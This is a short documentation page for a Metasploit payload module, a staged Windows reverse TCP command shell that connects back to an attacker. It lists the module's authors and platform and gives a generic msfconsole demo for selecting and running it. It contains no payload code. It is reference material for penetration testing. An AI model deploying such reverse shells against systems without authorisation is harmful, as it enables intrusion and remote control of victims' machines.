## Windows Command Shell, Reverse TCP Stager (No NX or Win7)

Spawn a piped command shell (staged). Connect back to the 
attacker (No NX)


## Module Name
payload/windows/shell/reverse_nonx_tcp

## Authors
* spoonm
* sf
* vlad902





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/shell/reverse_nonx_tcp
msf payload(reverse_nonx_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_nonx_tcp) > set TARGET <target-id>
msf payload(reverse_nonx_tcp) > show options
   ... show and set options ...
msf payload(reverse_nonx_tcp) > run
```
    
    